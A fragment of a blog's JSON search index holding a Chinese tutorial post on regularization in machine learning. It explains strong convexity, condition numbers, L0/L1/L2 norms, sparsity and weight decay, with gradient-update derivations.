https://xz.aliyun.com/t/5505"},{"title":"机器学习中的正则化","date":"2019-10-13","updated":"2024-03-19","path":"2019/10/13/机器学习中的正则化/","text":"关于正则化的理解 正则化是为了防止过拟合 如下图，红色这条“想象力”过于丰富上下横跳的曲线就是过拟合情形。结合上图和正则化的英文 Regularizaiton-Regular-Regularize，直译应该是：规则化（加个“化”字变动词，自豪一下中文还是强）。什么是规则？你妈喊你6点前回家吃饭，这就是规则，一个限制。同理，在这里，规则化就是说给需要训练的目标函数加上一些规则（限制），让他们不要自我膨胀。正则化，看起来，挺不好理解的，追其根源，还是“正则”这两字在中文中实在没有一个直观的对应，如果能翻译成规则化，更好理解。但我们一定要明白，搞学术，概念名词的准确是十分重要，对于一个重要唯一确定的概念，为它安上一个不会产生歧义的名词是必须的，正则化的名称没毛病，只是从如何理解的角度，要灵活和类比。 相关概念 1.强凸性 强凸性多用在优化中(Optimization)，特别是保证很多基于梯度下降方法的算法的线形收敛速率的条件之一。 一个可微函数强凸的定义是： f(y)≥f(x)+∇f(x)T(y−x)+u2∥y−x∥2f(y)≥f(x)+∇f(x)T(y−x)+u2 \\begin{Vmatrix}y−x\\end{Vmatrix}2 f(y)≥f(x)+∇f(x)T(y−x)+u2​y−x​​2 值得注意的是，强凸性并不要求函数处处可微(differentiable),当函数不光滑的时候，梯度即用次梯度(sub-gradient)代替。从表达式来看，强凸比一般的凸函数更严格在于其中的的二次项$$u2∥y−x∥22u​∥y−x∥2$$.因此可以将其表述为u-strong convex。 这个强凸的性质是很重要的。直观从一维函数来说，一般凸函数只要求函数曲线在其切线之上，至于“上”多少没有要求，也就意味着曲线可以无限“贴着”切线，只要保持在其上就行了。 直观来讲，convex 性质是指函数曲线位于该点处的切线，也就是线性近似之上，而 strongly convex 则进一步要求位于该处的一个二次函数上方，也就是说要求函数不要太“平坦”而是可以保证有一定的“向上弯曲”的趋势。专业点说，就是convex 可以保证函数在任意一点都处于它的一阶泰勒函数之上，而strongly convex可以保证函数在任意一点都存在一个非常漂亮的二次下界quadratic lower bound。当然这是一个很强的假设，但是同时也是非常重要的假设。可能还不好理解，那我们画个图来形象的理解下。 毫无疑问，在优化特别是梯度优化中，这种微弱的梯度变化很难实现快速优化，有可能在有限次数还达不到收敛。如果我们取一个接近最小值的解，这也很难。“非常”接近只是一个定性理解，在这种情况下会出现最优解很近似但是决策变量相差巨大的糟糕情况。这时候，多加一个二次项的，保证有一个二次下界，那么不会出现“贴着”切线的情况，优化也变得更加简单。 有的情况下，没有强凸的条件，可以人为加上一个二次项，以获得强凸特性。 我们取我们的最优解w的地方。如果我们的函数f(w)，见左图，也就是红色那个函数，都会位于蓝色虚线的那根二次函数之上，这样就算wt和w离的比较近的时候，f(wt)和f(w*)的值差别还是挺大的，也就是会保证在我们的最优解w附近的时候，还存在较大的梯度值，这样我们才可以在比较少的迭代次数内达到w。但对于右图，红色的函数f(w)只约束在一个线性的蓝色虚线之上，假设是如右图的很不幸的情况（非常平坦），那在wt还离我们的最优点w很远的时候，我们的近似梯度(f(wt)-f(w))/(wt-w*)就已经非常小了，在wt处的近似梯度∂f/∂w就更小了，这样通过梯度下降wt+1=wt-α*(∂f/∂w)，我们得到的结果就是w的变化非常缓慢，像蜗牛一样，非常缓慢的向我们的最优点w*爬动，那在有限的迭代时间内，它离我们的最优点还是很远。 2.ill-conditioned 优化有两大难题，一是：局部最小值，二是：ill-condition病态问题。前者就不说了，大家都懂吧，我们要找的是全局最小值，如果局部最小值太多，那我们的优化算法就很容易陷入局部最小而不能自拔，这很明显不是观众愿意看到的剧情。那下面我们来聊聊ill-condition。ill-condition对应的是well-condition。那他们分别代表什么？假设我们有个方程组AX=b，我们需要求解X。如果A或者b稍微的改变，会使得X的解发生很大的改变，那么这个方程组系统就是ill-condition的，反之就是well-condition的。我们具体举个例子吧： 咱们先看左边的那个。第一行假设是我们的AX=b，第二行我们稍微改变下b，得到的x和没改变前的差别很大，看到吧。第三行我们稍微改变下系数矩阵A，可以看到结果的变化也很大。换句话来说，这个系统的解对系数矩阵A或者b太敏感了。又因为一般我们的系数矩阵A和b是从实验数据里面估计得到的，所以它是存在误差的，如果我们的系统对这个误差是可以容忍的就还好，但系统对这个误差太敏感了，以至于我们的解的误差更大，那这个解就太不靠谱了。所以这个方程组系统就是ill-conditioned病态的，不正常的，不稳定的，有问题的，哈哈。这清楚了吧。右边那个就叫well-condition的系统了。 还是再啰嗦一下吧，对于一个ill-condition的系统，我的输入稍微改变下，输出就发生很大的改变，这不好啊，这表明我们的系统不能实用啊。你想想看，例如对于一个回归问题y=f(x)，我们是用训练样本x去训练模型f，使得y尽量输出我们期待的值，例如0。那假如我们遇到一个样本x’，这个样本和训练样本x差别很小，面对他，系统本应该输出和上面的y差不多的值的，例如0.00001，最后却给我输出了一个0.9999，这很明显不对呀。就好像，你很熟悉的一个人脸上长了个青春痘，你就不认识他了，那你大脑就太差劲了，哈哈。所以如果一个系统是ill-conditioned病态的，我们就会对它的结果产生怀疑。那到底要相信它多少呢？我们得找个标准来衡量吧，因为有些系统的病没那么重，它的结果还是可以相信的，不能一刀切吧。终于回来了，上面的condition number就是拿来衡量ill-condition系统的可信度的。condition number衡量的是输入发生微小变化的时候，输出会发生多大的变化。也就是系统对微小变化的敏感度。condition number值小的就是well-conditioned的，大的就是ill-conditioned的。 如果方阵A是非奇异的，那么A的conditionnumber定义为： 也就是矩阵A的norm乘以它的逆的norm。所以具体的值是多少，就要看你选择的norm是什么了。如果方阵A是奇异的，那么A的condition number就是正无穷大了。实际上，每一个可逆方阵都存在一个condition number。但如果要计算它，我们需要先知道这个方阵的norm（范数）和Machine Epsilon（机器的精度）。为什么要范数？范数就相当于衡量一个矩阵的大小，我们知道矩阵是没有大小的，当上面不是要衡量一个矩阵A或者向量b变化的时候，我们的解x变化的大小吗？所以肯定得要有一个东西来度量矩阵和向量的大小吧？对了，他就是范数，表示矩阵大小或者向量长度。OK，经过比较简单的证明，对于AX=b，我们可以得到以下的结论： 也就是我们的解x的相对变化和A或者b的相对变化是有像上面那样的关系的，其中k(A)的值就相当于倍率，看到了吗？相当于x变化的界。 对condition number来个一句话总结：conditionnumber是一个矩阵（或者它所描述的线性系统）的稳定性或者敏感度的度量，如果一个矩阵的condition number在1附近，那么它就是well-conditioned的，如果远大于1，那么它就是ill-conditioned的，如果一个系统是ill-conditioned的，它的输出结果就不要太相信了。 3.范数 一、L0范数与L1范数 L1范数是指向量中各个元素绝对值之和，也称街区距离（city-block），也有个美称叫“稀疏规则算子”（Lasso regularization）。 L0范数是指向量中非0的元素的个数。如果我们用L0范数来规则化一个参数矩阵W的话，就是希望W的大部分元素都是0。这太直观了，太露骨了吧，换句话说，让参数W是稀疏的。OK，看到了“稀疏”二字，大家都应该从当下风风火火的“压缩感知”和“稀疏编码”中醒悟过来，原来用的漫山遍野的“稀疏”就是通过这玩意来实现的。但你又开始怀疑了，是这样吗？看到的papers世界中，稀疏不是都通过L1范数来实现吗？脑海里是不是到处都是||W||1影子呀！几乎是抬头不见低头见。没错，这就是这节的题目把L0和L1放在一起的原因，因为他们有着某种不寻常的关系。那我们再来看看L1范数是什么？它为什么可以实现稀疏？为什么大家都用L1范数去实现稀疏，而不是L0范数呢？ 现在我们来分析下这个价值一个亿的问题：为什么L1范数会使权值稀疏？有人可能会这样给你回答“它是L0范数的最优凸近似”。实际上，还存在一个更美的回答：任何的规则化算子，如果他在Wi=0的地方不可微，并且可以分解为一个“求和”的形式，那么这个规则化算子就可以实现稀疏。这说是这么说，W的L1范数是绝对值，|w|在w=0处是不可微，但这还是不够直观。这里因为我们需要和L2范数进行对比分析。所以关于L1范数的直观理解，请待会看看第二节。 对了，上面还有一个问题：既然L0可以实现稀疏，为什么不用L0，而要用L1呢？个人理解一是因为L0范数很难优化求解（NP难问题），二是L1范数是L0范数的最优凸近似，而且它比L0范数要容易优化求解。所以大家才把目光和万千宠爱转于L1范数。 OK，来个一句话总结：L1范数和L0范数可以实现稀疏，L1因具有比L0更好的优化求解特性而被广泛应用。 L1正则化数学解释 设损失函数为： ℓ=ℓ0+λ∑w∣w∣\\ell = \\ell_0 + {\\lambda}\\sum_w{|w|} ℓ=ℓ0​+λw∑​∣w∣ 其中L0表示没有正则化时的损失函数。对它求w的偏导： ∂ℓ∂w=∂ℓ0∂w+λ⋅sgn(w)\\frac{\\partial{\\ell}}{\\partial{w}} = \\frac{\\partial{\\ell_0}}{\\partial{w}} + {\\lambda}\\cdot sgn(w) ∂w∂ℓ​=∂w∂ℓ0​​+λ⋅sgn(w) sgn(w)sgn(w)sgn(w)表示w的符号。对w进行更新： w=w−η∂ℓ∂w=w−ηλ⋅sgn(w)−η∂ℓ0∂ww = w -\\eta\\frac{\\partial{\\ell}}{\\partial{w}} = w-{\\eta \\lambda}\\cdot sgn(w)-\\eta\\frac{\\partial{\\ell_0}}{\\partial{w}} w=w−η∂w∂ℓ​=w−ηλ⋅sgn(w)−η∂w∂ℓ0​​ 可以看出，L1正则化是通过加上或减去一个常量ηλ{\\eta \\lambda}ηλ,让w向0靠近；对比L2正则化，它使用了一个乘性因子 (1−ηλ)(1-{\\eta \\lambda})(1−ηλ)去调整权重，使权重不断衰减。因此可以得出：当∣w∣|w|∣w∣很大时,L2对权重的衰减速度比L1大得多，当∣w∣|w|∣w∣很小时，L1对权重的缩小比L2快得多。 这也就解释了为什么L1正则能让模型变得稀疏。L1对于小权重减小地很快，对大权重减小较慢，因此最终模型的权重主要集中在那些高重要度的特征上，对于不重要的特征，权重会很快趋近于0。所以最终权重w会变得稀疏。 好，到这里，我们大概知道了L1可以实现稀疏，但我们会想呀，为什么要稀疏？让我们的参数稀疏有什么好处呢？这里扯两点： 1）特征选择(Feature Selection)： 大家对稀疏规则化趋之若鹜的一个关键原因在于它能实现特征的自动选择。一般来说，xi的大部分元素（也就是特征）都是和最终的输出yi没有关系或者不提供任何信息的，在最小化目标函数的时候考虑xi这些额外的特征，虽然可以获得更小的训练误差，但在预测新的样本时，这些没用的信息反而会被考虑，从而干扰了对正确yi的预测。稀疏规则化算子的引入就是为了完成特征自动选择的光荣使命，它会学习地去掉这些没有信息的特征，也就是把这些特征对应的权重置为0。 2）可解释性(Interpretability)： 另一个青睐于稀疏的理由是，模型更容易解释。例如患某种病的概率是y，然后我们收集到的数据x是1000维的，也就是我们需要寻找这1000种因素到底是怎么影响患上这种病的概率的。假设我们这个是个回归模型：y=w1x1+w2x2+…+w1000x1000+b（当然了，为了让y限定在[0,1]的范围，一般还得加个Logistic函数）。通过学习，如果最后学习到的w就只有很少的非零元素，例如只有5个非零的wi，那么我们就有理由相信，这些对应的特征在患病分析上面提供的信息是巨大的，决策性的。也就是说，患不患这种病只和这5个因素有关，那医生就好分析多了。但如果1000个wi都非0，医生面对这1000种因素，累觉不爱。 二、L2范数 除了L1范数，还有一种更受宠幸的规则化范数是L2范数: ∣∣W∣∣2||W||_2∣∣W∣∣2​。它也不逊于L1范数，它有两个美称，在回归里面，有人把有它的回归叫“岭回归”（Ridge Regression），有人也叫它“权值衰减weight decay”。 L2范数是指向量各元素的平方和然后求平方根(也称欧几里得范数，欧氏距离)。我们让L2范数的规则项∣∣W∣∣2||W||_2∣∣W∣∣2​最小，有选择地让某些 w 变小[^1]，但与L1范数不同，它不会让它等于0，而是接近于0，这里是有很大的区别的哦。而越小的参数说明模型越简单，越简单的模型则越不容易产生过拟合现象。 L2正则化可以解决模型训练中的过拟合现象，它也被称为权重衰减。在回归模型中，这也被称为岭回归。我们先介绍L2正则化的实现方式，然后定性地介绍一下为什么L2正则化可以防止过拟合。 设损失函数为 ℓ=ℓ0+λ2∑ww2\\ell = \\ell_0 + \\frac{\\lambda}{2}\\sum_w{w^2} ℓ=ℓ0​+2λ​w∑​w2 其中L0表示没有正则化时的损失函数。对它求w的偏导： ∂ℓ∂w=∂ℓ0∂w+λw\\frac{\\partial{\\ell}}{\\partial{w}} = \\frac{\\partial{\\ell_0}}{\\partial{w}} + {\\lambda w} ∂w∂ℓ​=∂w∂ℓ0​​+λw 对w进行更新： w=w−η∂ℓ∂w=(1−ηλ)w−η∂ℓ0∂ww = w - \\eta\\frac{\\partial{\\ell}}{\\partial{w}} = (1-\\eta \\lambda)w-\\eta\\frac{\\partial{\\ell_0}}{\\partial{w}} w=w−η∂w∂ℓ​=(1−ηλ)w−η∂w∂ℓ0​​ 我们知道，没有正则化的参数更新为: w=w−η∂ℓ0∂ww = w - \\eta\\frac{\\partial{\\ell_0}}{\\partial{w}} w=w−η∂w∂ℓ0​​ 而L2正则化使用了一个乘性因子 (1−ηλ)(1-{\\eta \\lambda})(1−ηλ)去调整权重，因此权重会不断衰减，并且在权重较大时衰减地快，权重较小时衰减得慢。 下面换一种方式来理解L2正则化对权重的限制。我们的目标是最小化下面的损失函数： min⁡L=L0(w)+λ∑ww2\\min {L = L_0(w) + {\\lambda}\\sum_w{w^2} } minL=L0​(w)+λw∑​w2 为了L最小，需要让L0和正则化项的和能够最小。若w变大让L0减小，∑ww2\\sum_w{w^2}∑w​w2也会变大，后者就会抑制前者，从而让w不会上升地过大。此时λ\\lambdaλ就像是一个调整模型拟合精度与泛化能力的权重因子。 现在我们知道了，L2正则化能够限制参数的大小。那么，为什么参数大小被限制了，这个模型就是一个简单的模型，就能够防止过拟合了呢？回到我们最初开始介绍的多项式回归$$y = a_0x^9 + a_1x^8 + …+ a_9$$,当参数很小时，高次方项的影响就会变得十分微弱，这使模型不会对某一个输入太过敏感，从而近似学习到一条简单的曲线，类似最开始的线性模型。也就是说，即使你预设的回归模型是一个9次的多项式回归，通过正则化学习，高次项前的系数 会变得很小，最后的曲线类似一条直线，这就是让模型变成了一个简单的模型。 总结一下: 正则化让模型根据训练数据中常见的模式来学习相对简单的模型，无正则化的模型用大参数学习大噪声。 L2正则化通过权重衰减，保证了模型的简单，提高了泛化能力。 三、L1,L2正则化的形象理解 理解一：解的表示 L1、L2正则化还有另一种表示方式： L1：arg⁡min⁡∑x(y−wx)2, s.t.∣∣w∣∣1≤t\\arg\\min{\\sum_x{(y-wx)^2}},\\ \\ \\ \\ s.t.||w||_1\\leq{t}argmin∑x​(y−wx)2, s.t.∣∣w∣∣1​≤t L2：arg⁡min⁡∑x(y−wx)2, s.t.∣∣w∣∣2≤t\\arg\\min{\\sum_x{(y-wx)^2}},\\ \\ \\ \\ s.t.||w||_2\\leq{t}argmin∑x​(y−wx)2, s.t.∣∣w∣∣2​≤t 如上图所示，假设w是一个二维的向量，则目标函数可以用一圈圈等值线表示，约束条件用图中黑线表示，而我们要找的最优解，就在等值线和约束线第一次相交的地方。 左图是L1正则化的情况，在特征为二维时，约束线是一个菱形，等值线极有可能最先与顶点相交，在这种情况下有一个维度的特征就会为0，这就带来了稀疏。当特征的维度变高，坐标轴上角与边都会变多，这更会加大等值线与他们先相交的概率，从而导致了稀疏性。 L2正则化不同，如右图所示，它的约束线是一个圆形，等值线可能与它任意一个位置的点首先相切，这个切点在坐标轴上的概率大大 减小，从而不太容易导致稀疏。 理解二：下降速度 另外从下降速度来看，L1正则化是绝对值函数，L2正则化是二次函数，他们的函数图形如上图所示。可以看出L1正则化的下降速度一直都是一致的，这也符合之间得出的结论：L1正则化通过一个常数 ηλ⋅sgn(w){\\eta \\lambda}\\cdot sgn(w)ηλ⋅sgn(w) 来让权重减小： w=w−η∂ℓ∂w=w−ηλ⋅sgn(w)−η∂ℓ0∂ww = w -\\eta\\frac{\\partial{\\ell}}{\\partial{w}} = w-{\\eta \\lambda}\\cdot sgn(w)-\\eta\\frac{\\partial{\\ell_0}}{\\partial{w}} w=w−η∂w∂ℓ​=w−ηλ⋅sgn(w)−η∂w∂ℓ0​​ 而L2正则化的下降速度不同，当w大的时候，下降较快，当w小的时候，下降较慢，这也符合我们之前推导的，L2正则化通过一个乘性因子(1−ηλ)(1-{\\eta \\lambda})(1−ηλ)去衰减权重： w=w−η∂ℓ∂w=(1−ηλ)w−η∂ℓ0∂ww = w -\\eta\\frac{\\partial{\\ell}}{\\partial{w}} = (1-{\\eta \\lambda})w-\\eta\\frac{\\partial{\\ell_0}}{\\partial{w}} w=w−η∂w∂ℓ​=(1−ηλ)w−η∂w∂ℓ0​​ 这种差异就导致当w较大时，L2的斜率大于L1，L2正则化权重衰减地比L1正则化快；w小时，L2斜率小于L1，L1正则化权重衰减地比L2正则化快。因此L1正则化最终会导致模型保留了重要的大权重连接，不重要的小权重都被衰减为0，产生了稀疏。而L2正则化可以通过限制权重大小让模型变得简单，但却不会导致稀疏。 四、L2范数的好处 1）学习理论的角度： 从学习理论的角度来说，L2范数可以防止过拟合，提升模型的泛化能力。 2）优化计算的角度： 从优化或者数值计算的角度来说，L2范数有助于处理 condition number不好的情况下矩阵求逆很困难的问题。因为目标函数如果是二次的，对于线性回归来说，那实际上是有解析解的，求导并令导数等于零即可得到最优解为： 然而，如果当我们的样本X的数目比每个样本的维度还要小的时候，矩阵XTX将会不是满秩的，也就是XTX会变得不可逆，所以w*就没办法直接计算出来了。或者更确切地说，将会有无穷多个解（因为我们方程组的个数小于未知数的个数）。也就是说，我们的数据不足以确定一个解，如果我们从所有可行解里随机选一个的话，很可能并不是真正好的解，总而言之，我们过拟合了。 但如果加上L2规则项，就变成了下面这种情况，就可以直接求逆了： 这里面，专业点的描述是：要得到这个解，我们通常并不直接求矩阵的逆，而是通过解线性方程组的方式（例如高斯消元法）来计算。考虑没有规则项的时候，也就是λ=0的情况，如果矩阵XTX的 condition number 很大的话，解线性方程组就会在数值上相当不稳定，而这个规则项的引入则可以改善condition number。 另外，如果使用迭代优化的算法，condition number 太大仍然会导致问题：它会拖慢迭代的收敛速度，而规则项从优化的角度来看，实际上是将目标函数变成λ-strongly convex（λ强凸）的了。 正则化 范数 L0,L1,L2范数在机器学习中的应用 L2范数的理解 数值分析：矩阵求逆-奇异性、条件数 [^1]:如何理解有选择性的降低: 按照上文预测疾病的例子，样本中的特征有很多，但大部分特征都是无关紧要的，只有一小部分关键的特征支撑起了整个预测模型。表现在系数 w 上就是，大部分的 w_i 都是不幸的，因为它们刚好与那些无关紧要的特征结对，它们的大小对整个模型的效果影响不大，于是在正则项的约束下它们都变小了，甚至趋近于0；而只有小部分的 w_i 比较幸运，它们刚好对应到了好的特征，于是它们肩负起了非常重大的责任，它们的微小变化会引起模型曲线在走势上的根本性变化，损失函数会急剧增大。如果正则项妄图约束这些关键的 w_i，使它们变小，那么由此造成的损失函数的扩大将远大于从正则项上获得的微小收益，所以这些关键的 w_i 可以几乎不受正则项的干涉。 但也不尽然，如果你把正则项之前的系数 λ 调到非常大，那么它就会敢于压迫那些关键的 w_i，最终造成的结果是，模型确实变简单了，但也严重偏离了预期方向，没什么卵用了。相反，如果你把 λ 调得非常小，那么正则项对每个 w_i 都惹不起，即使是那些无关紧要的 w_i 它也无力约束，最终就会导致模型过拟合（试想 λ 等于0的情况）。所以，损失函数与正则项就像是博弈的双方，它们之间的力量对比通过参数 λ 进行调和。只有把 λ 调合适了，才能得到既不过拟合，又相对简单的好模型。从这种意义上来说，L2正则项与L1正则项类似，也有“特征选择”的效果。 上面的描述比较感性，是我为了方便直观理解做的一些比喻，如果把模型的预测曲线做出来会更加严谨一些。即每个 w_i 都影响着曲线的形态，但是有主次之分。那些低阶的、关键的 w_i 控制着曲线的整体走势；而那些高阶的、次要的 w_i 则是在曲线整体走势的基础上稍微扭曲曲线的形态；当然，还会有更高阶的 w_i，它们负责在大的扭曲之上制造更小的扭曲，以此类推。 这样看来L2正则项的作用就很明显了，要改变预测曲线的整体走势肯地会造成损失函数的不满，但是把曲线的形态熨平似乎并没有什么不妥。而 λ 的大小则决定了正则项的视野，即多大的弯曲算作走势？多小的弯曲算作扭曲？"}],"categories":[],"tags":[]}